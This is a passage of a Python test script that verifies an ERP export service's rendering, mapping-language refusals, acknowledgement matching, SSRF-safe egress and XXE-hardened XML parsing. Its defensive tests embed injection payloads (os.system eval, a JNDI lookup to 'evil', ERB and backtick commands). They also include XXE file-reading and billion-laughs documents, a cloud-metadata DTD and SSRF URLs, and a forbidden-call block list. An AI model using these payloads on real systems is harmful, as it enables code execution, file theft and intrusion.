    separators, XML specials, quotes, a leading '=', CJK) through every format that takes the object."""
    from app.services.erp import presets as PR
    from app.services.erp import render as R
    from app.services.erp import synthetic as S
    from app.services.erp import vocabulary as v

    counts: dict[str, int] = {}
    currencies: set[str] = set()
    def held(seed: int) -> Any:
        obj = S.held_out(seed)
        if obj.kind == v.OBJECT_JOURNAL_ENTRY:
            # A journal line's account is never guessed (JOURNAL_ACCOUNT has no default): a customer maps it. Here
            # the lines whose code the lookup table does not know get an explicit account.
            for ln in obj.lines:
                if not ln.account_code and ln.code not in S.LOOKUPS["accounts"]:
                    ln.account = "6100"
        if obj.kind == v.OBJECT_PURCHASE_ORDER:
            # A purchase order line names an item (NetSuite item.id is required and looked up in the items
            # table): lines the held-out generator left without a known code are given one.
            for ln in obj.lines:
                if ln.code not in S.LOOKUPS["items"]:
                    ln.code = "SVC-100"
        return obj

    for seed in HELD_OUT_SEEDS:
        obj = held(seed)
        currencies.add(obj.currency)
        for fmt in v.FORMATS:
            for preset in (v.JSON_PRESETS if fmt == v.FORMAT_JSON else (v.PRESET_NONE,)):
                if obj.kind not in PR.supported_objects(fmt, preset):
                    continue
                if fmt == v.FORMAT_X12 and obj.kind == v.OBJECT_VENDOR_BILL and \
                        (obj.total * 100) != (obj.total * 100).to_integral_value():
                    # a 3-decimal amount (KWD) cannot be an N2 TDS01: refused, never rounded
                    err = _raises(lambda: render_golden(fmt, preset, obj.kind, held(seed)), R.RenderError)
                    assert err is not None and "N2" in str(err), f"seed {seed}: a 3-decimal X12 total was not refused"
                    counts["X12/NONE refused (N2)"] = counts.get("X12/NONE refused (N2)", 0) + 1
                    continue
                r = render_golden(fmt, preset, obj.kind, held(seed))
                problems = R.validate_rendered(R.TargetView(fmt, preset, S.CONFIG), obj.kind, r.data)
                assert not problems, f"seed {seed} {fmt}/{preset}/{obj.kind}: {problems[:2]}"
                figures_preserved(fmt, preset, obj.kind, held(seed), r)
                counts[f"{fmt}/{preset}"] = counts.get(f"{fmt}/{preset}", 0) + 1
    assert {"JPY", "KWD", "INR"} <= currencies, f"held-out currencies {currencies}"
    return {"seeds": len(HELD_OUT_SEEDS), "renders": sum(counts.values()), "by_target": counts,
            "currencies": sorted(currencies)}


# ---------------------------------------------------------------------------
# M: the mapping language
# ---------------------------------------------------------------------------

def _base_mapping(kind: str = "VENDOR_BILL") -> dict:
    return {"language": "fp-map/1", "object_kind": kind,
            "header": [{"to": "DocNumber", "value": {"path": "document_number"}, "required": True},
                       {"to": "Total", "value": {"path": "total", "transforms": [{"op": "number"}]}}],
            "lines": {"to": "Line", "fields": [{"to": "Amount", "value": {"path": "line.amount"}}]}}


def _hdr(value: dict, to: str = "X") -> dict:
    spec = _base_mapping()
    spec["header"] = spec["header"] + [{"to": to, "value": value}]
    return spec


#: Everything a mapping could smuggle code or a template through -- each must be REFUSED on save.
def refusal_corpus() -> list[tuple[str, Any]]:
    long_ = "x" * 70000
    deep: dict = {"path": "total"}
    for _ in range(8):
        deep = {"coalesce": [deep]}
    return [
        ("an eval key", _hdr({"eval": "__import__('os').system('id')"})),
        ("an exec key on a field", {**_base_mapping(), "header": [{"to": "X", "value": {"path": "total"}, "exec": "1"}]}),
        ("a lambda key", _hdr({"lambda": "x: x"})),
        ("a python key at the top", {**_base_mapping(), "python": "print(1)"}),
        ("a script transform", _hdr({"path": "total", "transforms": [{"op": "script", "code": "1+1"}]})),
        ("an unknown transform", _hdr({"path": "total", "transforms": [{"op": "shell", "cmd": "ls"}]})),
        ("a Jinja template in a const", _hdr({"const": "{{ 7*7 }}"})),
        ("a Jinja statement", _hdr({"const": "{% for x in y %}{% endfor %}"})),
        ("a ${} template", _hdr({"const": "${jndi:ldap://evil/a}"})),
        ("an ERB/ASP template", _hdr({"const": "<%= system('id') %>"})),
        ("a Ruby #{} template", _hdr({"const": "#{`id`}"})),
        ("a backtick", _hdr({"const": "`id`"})),
        ("a %-format", _hdr({"const": "%(password)s"})),
        ("a str.format field", _hdr({"const": "{0.__class__}"})),
        ("an unknown object path", _hdr({"path": "__class__.__mro__"})),
        ("a dunder path segment", _hdr({"path": "vendor.__dict__"})),
        ("a line path in the header", _hdr({"path": "line.amount"})),
        ("an attribute-style 'to'", _hdr({"path": "total"}, to="__proto__.polluted")),
        ("a 'to' with a bracket", _hdr({"path": "total"}, to="Line[0]")),
        ("a control character", _hdr({"const": "ok\x00bad"})),
        ("a replace with a regex key", _hdr({"path": "total", "transforms": [{"op": "replace", "regex": ".*"}]})),
        ("a lookup of a table that does not exist", _hdr({"path": "vendor.entity_id", "transforms": [{"op": "lookup", "table": "nope"}]})),
        ("a lookup table name with a dot", _hdr({"path": "vendor.entity_id", "transforms": [{"op": "lookup", "table": "a.b"}]})),
        ("truncate over the limit", _hdr({"path": "document_number", "transforms": [{"op": "truncate", "max": 100000}]})),
        ("number with 9 decimals", _hdr({"path": "total", "transforms": [{"op": "number", "decimals": 9}]})),
        ("a date format with a letter token", _hdr({"path": "document_date", "transforms": [{"op": "date", "format": "YYYY-%m"}]})),
        ("more than 12 transforms", _hdr({"path": "document_number", "transforms": [{"op": "trim"}] * 13})),
        ("expressions nested too deep", _hdr(deep)),
        ("two expression kinds at once", _hdr({"path": "total", "const": 1})),
        ("multiply by a non-number", _hdr({"path": "total", "transforms": [{"op": "multiply", "by": "1e999999"}]})),
        ("a mapping for another object kind", {**_base_mapping(), "object_kind": "JOURNAL_ENTRY"}),
        ("another language version", {**_base_mapping(), "language": "fp-map/2"}),
        ("not an object", ["header"]),
        ("a mapping over 64 KiB", {**_base_mapping(), "description": long_}),
        ("lines from an unknown source", {**_base_mapping(), "lines": {"to": "Line", "from": "__globals__", "fields": []}}),
        ("a non-boolean required", {**_base_mapping(), "header": [{"to": "X", "value": {"path": "total"}, "required": "yes"}]}),
        ("a map with a nested value", _hdr({"path": "currency", "transforms": [{"op": "map", "values": {"INR": {"eval": "1"}}}]})),
    ]


def check_mapping_refusals() -> dict:
    """M1: the language refuses anything executable, any template, any unknown key, path, transform or table --
    and says where; a valid mapping is accepted unchanged."""
    from app.services.erp import mapping as M
    from app.services.erp import presets as PR

    contract = PR.contract("CSV", "NONE", "VENDOR_BILL")
    tables = {"vendors", "accounts"}
    refused: dict[str, str] = {}
    for label, spec in refusal_corpus():
        err = _raises(lambda: M.validate(spec, object_kind="VENDOR_BILL", contract=contract, lookup_tables=tables),
                      M.MappingError)
        assert err is not None, f"{label}: ACCEPTED"
        refused[label] = err.problems[0][:140]
        if label not in ("not an object", "a mapping over 64 KiB"):   # whole-document refusals have no location
            assert all(":" in p for p in err.problems), f"{label}: a problem without its location: {err.problems}"
    for label in ("an eval key", "an exec key on a field", "a lambda key", "a python key at the top",
                  "a replace with a regex key"):
        assert "never runs code" in refused[label], f"{label} was refused, but not as code: {refused[label]}"
    for label in ("a Jinja template in a const", "a ${} template", "a str.format field"):
        assert "looks like a template" in refused[label], f"{label}: {refused[label]}"
    ok = _base_mapping()
    assert M.validate(ok, object_kind="VENDOR_BILL", contract=contract, lookup_tables=tables) == ok
    # every default mapping of every target validates against its own contract and default tables
    for fmt, preset, kind in combos():
        spec = PR.default_mapping(fmt, preset, kind, "t1")
        M.validate(spec, object_kind=kind, contract=PR.contract(fmt, preset, kind),
                   lookup_tables=set(PR.table_names("t1").values()))
    # a fixed format refuses a field it does not have, and one missing a required field
    ubl_contract = PR.contract("UBL", "NONE", "VENDOR_BILL")
    spec = PR.default_mapping("UBL", "NONE", "VENDOR_BILL")
    bad = json.loads(json.dumps(spec))
    bad["header"].append({"to": "NotAUblField", "value": {"const": "x"}})
    assert _raises(lambda: M.validate(bad, object_kind="VENDOR_BILL", contract=ubl_contract), M.MappingError)
    missing = json.loads(json.dumps(spec))
    missing["header"] = [f for f in missing["header"] if f["to"] != "id"]
    err = _raises(lambda: M.validate(missing, object_kind="VENDOR_BILL", contract=ubl_contract), M.MappingError)
    assert err is not None and any("'id' is required" in p for p in err.problems), err
    # the source never evaluates anything
    src = t("mapping")
    code = "\n".join(line for line in src.splitlines() if not line.lstrip().startswith(("#", '"', "'")))
    body = code.split('"""', 2)[-1]
    for forbidden in ("eval(", "exec(", "__import__", "importlib", "getattr(", "setattr(", "format_map(", ".format(",
                      "Template(", "jinja", "subprocess", "os.system", "builtins", "re.sub(", "re.match(", "re.search("):
        assert forbidden not in body, f"mapping.py uses {forbidden}"
    # its only regular expressions are its own constants (identifiers, table names): none built from a mapping
    assert re.findall(r"re\.compile\(", body) and all(
        line.lstrip().startswith("_") for line in body.splitlines() if "re.compile(" in line), "a regex built at run time"
    return refused


def check_mapping_semantics() -> dict:
    """M2: transforms are exact and total: money follows the currency (JPY 0, INR 2, KWD 3 decimals), minor units
    refuse what the currency cannot hold, a missing lookup key fails naming the line and field, and a role line
    (AP / TAX) never falls back to the default expense account."""
    from app.services.erp import canonical as C
    from app.services.erp import mapping as M
    from app.services.erp import presets as PR
    from app.services.erp import synthetic as S

    def ev(value: dict, obj: dict, lookups: Optional[dict] = None) -> Any:
        spec = {"language": "fp-map/1", "object_kind": "VENDOR_BILL", "header": [{"to": "X", "value": value}]}
        return M.evaluate(spec, obj, lookups=lookups or {}).header_dict()["X"]

    cases = {}
    for currency, total, want in (("JPY", "1234", "1234"), ("INR", "1234.5", "1234.50"), ("KWD", "1.125", "1.125"),
                                  ("USD", "0.005", "0.01")):
        got = ev({"path": "total", "transforms": [{"op": "number"}]}, {"currency": currency, "total": total})
        assert got == want, f"{currency} {total} -> {got!r}, expected {want!r}"
        cases[f"number {currency} {total}"] = got
    assert ev({"path": "total", "transforms": [{"op": "number", "decimals": 2, "decimal_sep": ",", "group_sep": "."}]},
              {"currency": "EUR", "total": "1234567.891"}) == "1.234.567,89"
    assert ev({"path": "total", "transforms": [{"op": "minor_units"}]}, {"currency": "KWD", "total": "1.125"}) == 1125
    assert ev({"path": "total", "transforms": [{"op": "minor_units"}]}, {"currency": "JPY", "total": "1234"}) == 1234
    err = _raises(lambda: ev({"path": "total", "transforms": [{"op": "minor_units"}]}, {"currency": "JPY", "total": "12.5"}),
                  M.MappingError)
    assert err is not None and "more decimals" in str(err), "minor units rounded a yen amount"
    assert ev({"path": "document_date", "transforms": [{"op": "date", "format": "DD MMM YYYY"}]},
              {"document_date": "2024-02-29"}) == "29 Feb 2024"
    assert ev({"path": "document_date", "transforms": [{"op": "edm_date"}]}, {"document_date": "2026-09-01"}) == "/Date(1788220800000)/"
    assert ev({"concat": [{"const": "FP "}, {"path": "document_number"}], "sep": ""}, {"document_number": "A-1"}) == "FP A-1"
    assert ev({"coalesce": [{"path": "memo"}, {"const": "none"}]}, {"memo": "  "}) == "none"
    # a missing lookup key: the posting fails, naming where
    bill = S.vendor_bill()
    bill.lines[1].code = "UNKNOWN-9"
    je = C.check(C.accrual(S.vendor_bill()))
    lookups = {k: dict(val) for k, val in S.LOOKUPS.items()}
    del lookups["accounts"]["AP"]
    err = _raises(lambda: M.evaluate(PR.default_mapping("CSV", "NONE", "JOURNAL_ENTRY"), je, lookups=lookups), M.MappingError)
    assert err is not None and any("'AP' is not in the lookup table 'accounts'" in p for p in err.problems), err
    assert any(p.startswith("line 4,") for p in err.problems), f"the problem does not name the line: {err.problems}"
    cases["AP role without an account"] = err.problems[0]
    del lookups["accounts"]["TAX"]
    record = None
    err = _raises(lambda: M.evaluate(PR.default_mapping("JSON", "QUICKBOOKS_ONLINE", "VENDOR_BILL"), S.vendor_bill(),
                                     lookups=lookups), M.MappingError)
    assert err is not None and "'TAX' is not in the lookup table 'accounts'" in str(err), \
        "a TAX line fell back to the default expense account"
    # a line code the table does not know DOES use the default expense account (on an expense line only)
    record = M.evaluate(PR.default_mapping("JSON", "QUICKBOOKS_ONLINE", "VENDOR_BILL"), bill, lookups=S.LOOKUPS)
    accounts = [ln["AccountBasedExpenseLineDetail.AccountRef.value"] for ln in record.line_dicts()]
    assert accounts == ["64", S.LOOKUPS["accounts"]["default"], "31"], accounts
    return cases


def check_canonical() -> None:
    """C1: the canonical object refuses what does not reconcile: line arithmetic, subtotal, total, a journal that
    does not balance, a line with both sides; money is quantized to the currency; the accrual balances."""
    from app.services.erp import canonical as C
    from app.services.erp import synthetic as S

    def refused(mutate: Callable[[Any], None], code: str) -> None:
        obj = S.vendor_bill()
        mutate(obj)
        err = _raises(lambda: C.check(obj), C.BuildError)
        assert err is not None and err.code == code, f"expected {code}, got {err!r}"

    refused(lambda o: setattr(o.lines[0], "amount", Decimal("60000.10")), "LINE_ARITHMETIC")
    refused(lambda o: setattr(o, "subtotal", Decimal("99999.00")), "SUBTOTAL")
    refused(lambda o: setattr(o, "total", Decimal("118000.02")), "TOTAL")
    refused(lambda o: setattr(o, "currency", "RUPEES"), "NO_CURRENCY")
    refused(lambda o: setattr(o, "lines", []), "NO_LINES")
    je = C.accrual(S.vendor_bill())
    je.lines[0].debit = Decimal("1")
    assert _raises(lambda: C.check(je), C.BuildError).code == "UNBALANCED"
    je = C.accrual(S.vendor_bill())
    je.lines[0].credit = Decimal("5")
    assert _raises(lambda: C.check(je), C.BuildError).code == "ONE_SIDE"
    ok = C.check(C.accrual(S.vendor_bill()))
    assert ok.total_debit == ok.total_credit == Decimal("118000.00") and ok.lines[-1].account_code == "AP"
    assert [ln.account_code for ln in ok.lines] == [None, None, "TAX", "AP"]
    jpy = S.vendor_bill()
    jpy.currency = "JPY"
    for ln in jpy.lines:
        ln.amount = ln.amount.quantize(Decimal(1))
    assert C.check(jpy).total == Decimal("118000")
    kwd = C.money(Decimal("1.2345"), "KWD")
    assert kwd == Decimal("1.235") and C.money(Decimal("2.5"), "JPY") == Decimal("3")
    a, b = S.vendor_bill(), S.vendor_bill()
    assert a.digest() == b.digest()
    b.notes.append("an explanation")
    assert a.digest() == b.digest(), "notes changed the digest"
    b.lines[0].description = "changed"
    assert a.digest() != b.digest(), "the digest ignores content"


# ---------------------------------------------------------------------------
# K: acknowledgements -- DONE only when the target says so
# ---------------------------------------------------------------------------

def check_x12_acks() -> dict:
    """K1: a 997 is matched to OUR interchange by group control number and transaction set: accepted, rejected
    (AK5 R), accepted-with-errors (E: a mismatch a person reads), another group's 997 (ignored), a 997 naming
    our group but not our set (a mismatch). Our 997 builder's output passes our own validator."""
    from app.services.erp import vocabulary as v
    from app.services.erp.formats import x12

    edi = render_golden("X12", "NONE", "VENDOR_BILL").data
    ctl = x12.ControlNumbers(42, 42).as_json()
    out = {}
    for status, want in (("A", v.OUTCOME_ACCEPTED), ("R", v.OUTCOME_REJECTED), ("E", v.OUTCOME_MISMATCH)):
        ack = x12.build_997(edi, status=status, control=7)
        assert not x12.validate(ack), f"our own 997 ({status}) fails our validator: {x12.validate(ack)[:2]}"
        outcome, message = x12.correlate(x12.parse_997(ack), ctl, "VENDOR_BILL")
        assert outcome == want, f"997 {status}: {outcome} ({message})"
        out[f"997 {status}"] = f"{outcome}: {message}"
    other = x12.build_997(render_golden("X12", "NONE", "VENDOR_BILL", control=x12.ControlNumbers(43, 43)).data)
    assert x12.correlate(x12.parse_997(other), ctl, "VENDOR_BILL")[0] == v.OUTCOME_PENDING, "another group's 997 settled ours"
    wrong_set = x12.build_997(edi).replace(b"AK2*810*0001", b"AK2*810*0002")
    assert x12.correlate(x12.parse_997(wrong_set), ctl, "VENDOR_BILL")[0] == v.OUTCOME_MISMATCH
    assert x12.correlate(x12.parse_997(x12.build_997(edi)), ctl, "PURCHASE_ORDER")[0] == v.OUTCOME_PENDING, \
        "a 997 for an 810 group settled an 850"
    assert _raises(lambda: x12.parse_997(edi), x12.X12Error), "an 810 read as a 997"
    return out


def check_file_acks() -> dict:
    """K2: Tally's import RESPONSE and .ack files: created -> accepted with Tally's voucher id; errors / line
    errors -> rejected with the reason; ignored (a voucher with our REMOTEID exists) or two vouchers -> mismatch."""
    from app.services.erp import vocabulary as v
    from app.services.erp.formats import tally
    from app.services.erp.transport import sftp

    def response(created=0, errors=0, ignored=0, vch="", line_error=""):
        le = f"<LINEERROR>{line_error}</LINEERROR>" if line_error else ""
        return (f"<ENVELOPE><HEADER><VERSION>1</VERSION><STATUS>1</STATUS></HEADER><BODY><DATA><IMPORTRESULT>"
                f"<RESPONSE><CREATED>{created}</CREATED><ALTERED>0</ALTERED><DELETED>0</DELETED><LASTVCHID>{vch}</LASTVCHID>"
                f"<IGNORED>{ignored}</IGNORED><ERRORS>{errors}</ERRORS><CANCELLED>0</CANCELLED><EXCEPTIONS>0</EXCEPTIONS>"
                f"</RESPONSE>{le}</IMPORTRESULT></DATA></BODY></ENVELOPE>").encode()

    cases = {
        "tally created": (response(created=1, vch="4711"), v.OUTCOME_ACCEPTED, "4711"),
        "tally error": (response(errors=1, line_error="Ledger 'Acme' does not exist!"), v.OUTCOME_REJECTED, None),
        "tally ignored": (response(ignored=1), v.OUTCOME_MISMATCH, None),
        "tally two vouchers": (response(created=2, vch="9"), v.OUTCOME_MISMATCH, "9"),
        "ack ACCEPTED": (b"ACCEPTED: BILL-1043\n", v.OUTCOME_ACCEPTED, "BILL-1043"),
        "ack REJECTED": (b"REJECTED: vendor 56 is blocked", v.OUTCOME_REJECTED, None),
        "ack json ok": (b'{"status": "POSTED", "id": 88}', v.OUTCOME_ACCEPTED, "88"),
        "ack json error": (b'{"status": "ERROR", "message": "period closed"}', v.OUTCOME_REJECTED, None),
        "ack unreadable": (b"<ENVELOPE><oops>", v.OUTCOME_MISMATCH, None),
        "ack says maybe": (b"PENDING", v.OUTCOME_MISMATCH, None),
    }
    out = {}
    for label, (content, want, ext) in cases.items():
        outcome, message, found = sftp.parse_ack_file(content)
        assert (outcome, found) == (want, ext), f"{label}: {(outcome, found)} ({message})"
        out[label] = f"{outcome}: {message}"
    assert "does not exist" in sftp.parse_ack_file(cases["tally error"][0])[1], "the Tally line error is not shown"
    assert tally.parse_response(response(created=1, vch="1"))["created"] == 1
    return out


def check_rest_acks() -> dict:
    """K3: a REST/OData answer is DONE only if it names the created record AND every figure it echoes matches what
    was sent (the currency's minor unit is the tolerance); a success naming no record is a mismatch; probes and
    idempotency keys are formed per preset."""
    from app.services.erp import synthetic as S
    from app.services.erp import vocabulary as v
    from app.services.erp.formats import jsonapi

    out = {}
    r = render_golden("JSON", "QUICKBOOKS_ONLINE", "VENDOR_BILL")
    good = {"Bill": {"Id": "145", "DocNumber": "INV-2026-0042", "TotalAmt": 118000.00}}
    ack = jsonapi.acknowledge("QUICKBOOKS_ONLINE", "VENDOR_BILL", r.body, jsonapi.loads(json.dumps(good)), location=None,
                              config=S.CONFIG, currency="INR")
    assert ack.outcome == v.OUTCOME_ACCEPTED and ack.external_id == "145", ack
    for label, resp, cur in (("total off by 1.00", {"Bill": {"Id": "145", "DocNumber": "INV-2026-0042", "TotalAmt": 117999.00}}, "INR"),
                             ("another document number", {"Bill": {"Id": "145", "DocNumber": "INV-2026-0043", "TotalAmt": 118000}}, "INR"),
                             ("no record named", {"Bill": {"DocNumber": "INV-2026-0042", "TotalAmt": 118000}}, "INR"),
                             ("KWD off by 2 fils", {"Bill": {"Id": "1", "DocNumber": "INV-2026-0042", "TotalAmt": 118000.002}}, "KWD")):
        a = jsonapi.acknowledge("QUICKBOOKS_ONLINE", "VENDOR_BILL", r.body, jsonapi.loads(json.dumps(resp)), location=None,
                                config=S.CONFIG, currency=cur)
        assert a.outcome == v.OUTCOME_MISMATCH, f"{label}: {a.outcome} ({a.message})"
        out[label] = a.message
    within = {"Bill": {"Id": "1", "DocNumber": "INV-2026-0042", "TotalAmt": 118000.001}}
    assert jsonapi.acknowledge("QUICKBOOKS_ONLINE", "VENDOR_BILL", r.body, jsonapi.loads(json.dumps(within)), location=None,
                               config=S.CONFIG, currency="KWD").outcome == v.OUTCOME_ACCEPTED, "1 fils is within tolerance"
    bc = render_golden("JSON", "BUSINESS_CENTRAL", "PURCHASE_ORDER")
    loc = "https://erp.example/api/v2.0/companies(c1)/purchaseOrders(8f7e6d5c-0000-4000-8000-000000000001)"
    a = jsonapi.acknowledge("BUSINESS_CENTRAL", "PURCHASE_ORDER", bc.body, {"number": "PO-7781"}, location=loc, config=S.CONFIG)
    assert a.external_id is not None, "an id in the Location header was not read"
    # probes: the look-up that decides whether a re-send is safe
    for preset, kind in (("QUICKBOOKS_ONLINE", "VENDOR_BILL"), ("ZOHO_BOOKS", "VENDOR_BILL"), ("BUSINESS_CENTRAL", "VENDOR_BILL"),
                         ("S4HANA_ODATA", "VENDOR_BILL"), ("NETSUITE_REST", "VENDOR_BILL")):
        path = jsonapi.probe_request(preset, kind, "INV-2026-0042", S.CONFIG)
        assert path and "INV-2026-0042" in path.replace("%2D", "-"), f"{preset}: no probe for {kind}: {path}"
        out[f"probe {preset}"] = path
    assert "INV%27%27X" in (jsonapi.probe_request("QUICKBOOKS_ONLINE", "VENDOR_BILL", "INV'X", S.CONFIG) or ""), \
        "a quote in a document number is not escaped in the probe query"
    found, ident = jsonapi.probe_result("QUICKBOOKS_ONLINE", "VENDOR_BILL",
                                        {"QueryResponse": {"Bill": [{"Id": "145"}]}}, S.CONFIG)
    assert (found, ident) == (True, "145")
    assert jsonapi.probe_result("QUICKBOOKS_ONLINE", "VENDOR_BILL", {"QueryResponse": {}}, S.CONFIG) == (False, None)
    assert jsonapi.preset("NETSUITE_REST").idempotency_header == "X-NetSuite-Idempotency-Key"
    assert jsonapi.preset("QUICKBOOKS_ONLINE").idempotency_query == "requestid" and jsonapi.preset("S4HANA_ODATA").csrf
    assert jsonapi.dumps({"a": Decimal("0.10"), "b": Decimal("1E+3")}) == '{"a":0.10,"b":1000}', "amounts not written exactly"
    return out


def check_backoff() -> dict:
    """R1: retries back off exponentially from 30 s with full jitter in [d/2, d], never above the 1-hour ceiling,
    never below the target's Retry-After."""
    from app.services.erp import service
    from app.services.erp import vocabulary as v

    rng = random.Random(47)
    seen = {}
    for attempt in range(1, 16):
        base = min(v.RETRY_CEILING_SECONDS, v.RETRY_BASE_SECONDS * 2 ** (attempt - 1))
        values = [service.backoff_seconds(attempt, rng=rng) for _ in range(400)]
        assert min(values) >= base // 2 and max(values) <= base, f"attempt {attempt}: {min(values)}..{max(values)} vs {base}"
        assert len(set(values)) > 5 or base < 10, f"attempt {attempt}: no jitter"
        seen[attempt] = [min(values), max(values)]
    assert service.backoff_seconds(1, 900, rng=rng) >= 900, "Retry-After ignored"
    assert max(service.backoff_seconds(40, rng=rng) for _ in range(100)) <= v.RETRY_CEILING_SECONDS
    return seen


def check_egress() -> dict:
    """N1: every ERP call goes through the SSRF-safe client (address pinned at connect; private, loopback and
    link-local refused); a test client that trusts the mocks is refused in production; nothing is fetched at
    import; credentials never reach a URL or a recorded body; SFTP pins the host key and refuses '..'."""
    import app.services.erp.transport.http as H
    import app.services.erp.transport.sftp as SF
    from app.core import ssrf_client

    out = {}
    src = t("http")
    assert "SSRFSafeHTTPClient(connect_timeout=min(10.0, timeout), total_timeout=timeout)" in src, "not the SSRF-safe client"
    assert "import requests" not in src and "import httpx" not in src and "urllib.request" not in src, "a raw HTTP client"
    for key in ("http", "sftp", "jsonapi", "service", "sources"):
        text = t(key)
        assert "requests.get(" not in text and "urlopen(" not in text, f"{key}: an unguarded fetch"
    # nothing at import: a fresh interpreter imports every ERP module (and the API, the action, the handler)
    # with sockets refused
    probe = ("import socket, sys\n"
             "def refused(*a, **k):\n    raise SystemExit('network access at import time')\n"
             "socket.socket.connect = refused\nsocket.getaddrinfo = refused\nsocket.create_connection = refused\n"
             "import pkgutil, importlib, app.services.erp as pkg\n"
             "names = [m.name for m in pkgutil.walk_packages(pkg.__path__, 'app.services.erp.')]\n"
             "for n in names + ['app.api.v1.erp', 'app.services.automation.actions.erp_post', 'app.workers.handlers.erp']:\n"
             "    importlib.import_module(n)\n"
             "print(len(names))\n")
    proc = subprocess.run([sys.executable, "-c", probe], cwd=str(BACKEND), capture_output=True, text=True, timeout=300)
    assert proc.returncode == 0, (proc.stdout + proc.stderr)[-1500:]
    out["modules imported without network"] = int(proc.stdout.strip().splitlines()[-1])
    for url in ("https://127.0.0.1/x", "https://10.0.0.8/x", "https://169.254.169.254/latest/meta-data", "https://[::1]/x"):
        err = _raises(lambda: ssrf_client.SSRFSafeHTTPClient(connect_timeout=2, total_timeout=3).request("GET", url))
        assert err is not None, f"{url} reached"
        out[url] = type(err).__name__
    assert _raises(lambda: H.base_url({"http": {"base_url": "http://erp.example"}})), "plain http accepted"
    assert _raises(lambda: H.base_url({"http": {"base_url": "https://user:pw@erp.example"}})), "credentials in the URL accepted"
    scrubbed = H.scrub('{"access_token": "abc123", "refresh_token":"r-9", "client_secret": "s"} password=hunter2')
    assert "abc123" not in scrubbed and "r-9" not in scrubbed and "hunter2" not in scrubbed, scrubbed
    kinds = {name: H._classify(exc)[0] for name, exc in (
        ("refused before connect", ssrf_client.ConnectError("Connection to erp.example:443 failed")),
        ("reset after sending", ssrf_client.ConnectError("Communication with erp.example failed")),
        ("forbidden address", ssrf_client.ForbiddenAddressError("10.0.0.1")),
        ("timeout mid-request", ssrf_client.TimeoutExceededError("read timed out")))}
    assert kinds == {"refused before connect": "TRANSIENT", "reset after sending": "UNCERTAIN",
                     "forbidden address": "PERMANENT", "timeout mid-request": "UNCERTAIN"}, kinds
    out["classification"] = kinds
    for cfg, message in (({"sftp": {"host": "sftp.example", "host_key_sha256": "none"}}, "host_key_sha256"),
                         ({"sftp": {"host": "sftp.example", "host_key_sha256": "SHA256:" + "A" * 43, "directory": "/in/../etc"}}, ".."),
                         ({"sftp": {"host": "a b", "host_key_sha256": "SHA256:" + "A" * 43}}, "host")):
        err = _raises(lambda: SF.settings(cfg), SF.SftpError)
        assert err is not None and message in str(err), f"{cfg}: {err}"
    assert "allow_private_for_tests" in t("sftp") and '== "production"' in t("sftp"), "the SFTP test switch is not refused in production"
    from app.core.config import settings as app_settings

    saved = getattr(app_settings, "ENVIRONMENT", "development")
    object.__setattr__(app_settings, "ENVIRONMENT", "production")
    try:
        err = _raises(lambda: ssrf_client.SSRFSafeHTTPClient(connect_timeout=1, total_timeout=1, allow_private_ranges=True))
        assert err is not None, "the private-range test switch works in production"
        SF.allow_private_for_tests = True
        err = _raises(lambda: SF._resolve("127.0.0.1", 22), SF.SftpError)
        assert err is not None and "production" in str(err), "the SFTP private-address test switch works in production"
    finally:
        SF.allow_private_for_tests = False
        object.__setattr__(app_settings, "ENVIRONMENT", saved)
    return out


XML_MODULES = {"lxml", "lxml.etree", "xml.etree", "xml.etree.ElementTree", "xml.dom", "xml.dom.minidom", "xml.sax",
               "xmltodict"}   # scripts/verify_arch16.py S1


def check_xml_safety() -> dict:
    """N2: ERP XML reaches lxml only through formats/xmlsafe.py (ARCH-16 S1, which ARCH-47 widened for exactly that
    module); untrusted XML declaring a DOCTYPE or ENTITY is refused -- an external entity (XXE) reading a local
    file, a parameter entity, nested entities ("billion laughs"), the same in UTF-16 -- and even a parser handed
    such a document resolves nothing; Tally responses, .ack files, pasted response files and XLSX parts are all
    read that way; a schema outside the vendored directory is refused."""
    import ast

    from app.services.erp.formats import tabular, tally, xmlsafe, xsd

    out: dict[str, Any] = {}
    offenders = []
    keyed = {v_.resolve(): k for k, v_ in ORIGINAL_F.items()}
    for path in sorted(E_.rglob("*.py")):
        if path.resolve() == ORIGINAL_F["xmlsafe"].resolve():
            continue
        key = keyed.get(path.resolve())
        tree = ast.parse(t(key) if key else read(path), filename=str(path))
        for node in ast.walk(tree):
            names = [a.name for a in node.names] if isinstance(node, ast.Import) else \
                [node.module] if isinstance(node, ast.ImportFrom) else []
            offenders += [f"{path.relative_to(BACKEND)} imports {n}" for n in names if n in XML_MODULES]
    assert not offenders, f"XML parsed outside xmlsafe.py: {offenders}"
    text16 = t("v16")
    assert 'ERP_XML_SAFE = "app/services/erp/formats/xmlsafe.py"' in text16, "ARCH-16 S1 does not name the hardened module"
    for needle in ('"resolve_entities=False"', '"no_network=True"', '"load_dtd=False"'):
        assert needle in text16, f"ARCH-16 S1 no longer requires {needle}"
    safe_text = t("xmlsafe")
    for needle in ("resolve_entities=False", "no_network=True", "load_dtd=False", "huge_tree=False"):
        assert needle in safe_text, f"xmlsafe.py: {needle} missing"
    secret = "arch47-xxe-secret-" + uuid.uuid4().hex
    tmp = Path(tempfile.mkdtemp(prefix="arch47-xxe-"))
    try:
        (tmp / "secret.txt").write_text(secret, encoding="utf-8")
        uri = (tmp / "secret.txt").as_uri()
        hostile = {
            "external entity (XXE)": f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{uri}">]><r>&x;</r>',
            "parameter entity": f'<!DOCTYPE r [<!ENTITY % p SYSTEM "{uri}"> %p;]><r/>',
            "billion laughs": '<!DOCTYPE r [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
                              '<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><r>&c;&c;&c;</r>',
            "spaced declaration": f'<?xml version="1.0"?><! doctype r [<!ENTITY x SYSTEM "{uri}">]><r>&x;</r>',
            "external DTD": '<!DOCTYPE r SYSTEM "http://169.254.169.254/latest/meta-data"><r/>',
        }
        for name, doc in hostile.items():
            for label, data in ((name, doc.encode("utf-8")), (name + " in UTF-16", b"\xff\xfe" + doc.encode("utf-16-le"))):
                err = _raises(lambda: xmlsafe.parse(data), xmlsafe.XMLRefused)
                assert err is not None, f"{label} accepted"
                out[label] = str(err)[:80]
        # defence in depth: the parser itself, handed the XXE document directly, resolves nothing
        from lxml import etree as _lx  # the gate may; the application may not (checked above)

        root = _lx.fromstring(hostile["external entity (XXE)"].encode(), xmlsafe._hardened())
        assert secret not in _lx.tostring(root).decode() and secret not in "".join(root.itertext()), \
            "the hardened parser resolved an external entity"
